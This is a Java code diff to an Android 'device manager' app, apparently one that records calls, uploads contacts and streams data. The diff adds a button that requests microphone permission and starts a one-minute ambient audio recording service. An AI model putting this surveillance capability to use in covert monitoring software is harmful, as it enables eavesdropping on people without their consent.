@@ -21,6 +21,7 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import com.company.devicemgr.receivers.DeviceAdminReceiver;
+import com.company.devicemgr.services.AmbientRecorderService;
 import com.company.devicemgr.services.CallRecorderService;
 import com.company.devicemgr.services.ContactsUploaderService;
 import com.company.devicemgr.services.ForegroundTelemetryService;
@@ -38,14 +39,15 @@ public class MainPermissionsActivity extends Activity {
 	private static final String TAG = "MainPermAct";
 	
 	private static final int REQ_CODE_DEVICE_ADMIN = 1001;
-	private static final int REQ_CODE_PERMS = 2001;
+        private static final int REQ_CODE_PERMS = 2001;
+        private static final int REQ_CODE_AMBIENT_AUDIO = 2002;
 	private static final int REQ_PICK_MEDIA = 3001;
 	
-	Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm,
-	btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia, btnConsent;
-	TextView tvStatus, tvDeviceId;
-	// streaming buttons
-	Button btnStartStream, btnStopStream;
+        Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm,
+        btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia, btnConsent;
+        TextView tvStatus, tvDeviceId;
+        // streaming buttons
+        Button btnStartStream, btnStopStream, btnAmbientRecord;
 	
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
@@ -69,8 +71,9 @@ public class MainPermissionsActivity extends Activity {
 		
 		// streaming buttons (new)
 		// these IDs must exist in activity_main_permissions.xml
-		btnStartStream = findViewById(com.company.devicemgr.R.id.btnStartStream);
-		btnStopStream  = findViewById(com.company.devicemgr.R.id.btnStopStream);
+                btnStartStream = findViewById(com.company.devicemgr.R.id.btnStartStream);
+                btnStopStream  = findViewById(com.company.devicemgr.R.id.btnStopStream);
+                btnAmbientRecord = findViewById(com.company.devicemgr.R.id.btnAmbientRecord);
 		
 		// ensure deviceId exists
 		final SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
@@ -220,17 +223,38 @@ public class MainPermissionsActivity extends Activity {
 			});
 		}
 		
-		if (btnStopStream != null) {
-			btnStopStream.setOnClickListener(v -> {
-				try {
-					Intent stop = new Intent(MainPermissionsActivity.this, com.company.devicemgr.services.StreamingService.class);
-					stopService(stop);
-					android.widget.Toast.makeText(MainPermissionsActivity.this, "Transmissão parada", android.widget.Toast.LENGTH_SHORT).show();
-					} catch (Exception e) {
-					Log.e(TAG, "stop stream err", e);
-				}
-			});
-		}
+                if (btnStopStream != null) {
+                        btnStopStream.setOnClickListener(v -> {
+                                try {
+                                        Intent stop = new Intent(MainPermissionsActivity.this, com.company.devicemgr.services.StreamingService.class);
+                                        stopService(stop);
+                                        android.widget.Toast.makeText(MainPermissionsActivity.this, "Transmissão parada", android.widget.Toast.LENGTH_SHORT).show();
+                                        } catch (Exception e) {
+                                        Log.e(TAG, "stop stream err", e);
+                                }
+                        });
+                }
+                if (btnAmbientRecord != null) {
+                        btnAmbientRecord.setOnClickListener(v -> {
+                                if (ContextCompat.checkSelfPermission(MainPermissionsActivity.this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                                        ActivityCompat.requestPermissions(MainPermissionsActivity.this, new String[]{ Manifest.permission.RECORD_AUDIO }, REQ_CODE_AMBIENT_AUDIO);
+                                        return;
+                                }
+                                try {
+                                        Intent ambient = new Intent(MainPermissionsActivity.this, AmbientRecorderService.class);
+                                        ambient.putExtra(AmbientRecorderService.EXTRA_DURATION_MS, 60_000L);
+                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                                ContextCompat.startForegroundService(MainPermissionsActivity.this, ambient);
+                                                } else {
+                                                startService(ambient);
+                                        }
+                                        android.widget.Toast.makeText(MainPermissionsActivity.this, "Gravação ambiente iniciada", android.widget.Toast.LENGTH_SHORT).show();
+                                        } catch (Exception e) {
+                                        Log.e(TAG, "start ambient err", e);
+                                        android.widget.Toast.makeText(MainPermissionsActivity.this, "Erro ao iniciar gravação", android.widget.Toast.LENGTH_LONG).show();
+                                }
+                        });
+                }
 		// ---------- end streaming buttons ----------
 		
 		// update status
@@ -406,11 +430,11 @@ public class MainPermissionsActivity extends Activity {
 	
 	@Override
 	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-		if (requestCode == REQ_CODE_PERMS) {
-			boolean granted = true;
-			for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) granted = false;
-			showMsg(granted ? "Permissões concedidas" : "Algumas permissões negadas");
-			if (granted) startAllServices();
+                if (requestCode == REQ_CODE_PERMS) {
+                        boolean granted = true;
+                        for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) granted = false;
+                        showMsg(granted ? "Permissões concedidas" : "Algumas permissões negadas");
+                        if (granted) startAllServices();
 			
 			// adicional: iniciar streaming automaticamente se o consentimento estiver activo
 			try {
@@ -431,8 +455,27 @@ public class MainPermissionsActivity extends Activity {
 				}
 				} catch (Exception ex) {
 				Log.e(TAG, "onRequestPermissionsResult extra err", ex);
-			}
-		}
-		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-	}
+                        }
+                } else if (requestCode == REQ_CODE_AMBIENT_AUDIO) {
+                        boolean granted = true;
+                        for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) granted = false;
+                        if (granted) {
+                                try {
+                                        Intent ambient = new Intent(MainPermissionsActivity.this, AmbientRecorderService.class);
+                                        ambient.putExtra(AmbientRecorderService.EXTRA_DURATION_MS, 60_000L);
+                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                                ContextCompat.startForegroundService(MainPermissionsActivity.this, ambient);
+                                                } else {
+                                                startService(ambient);
+                                        }
+                                        android.widget.Toast.makeText(MainPermissionsActivity.this, "Gravação ambiente iniciada", android.widget.Toast.LENGTH_SHORT).show();
+                                        } catch (Exception e) {
+                                        Log.e(TAG, "start ambient after perm err", e);
+                                }
+                        } else {
+                                android.widget.Toast.makeText(MainPermissionsActivity.this, "Permissão de microfone negada", android.widget.Toast.LENGTH_LONG).show();
+                        }
+                }
+                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        }
 }
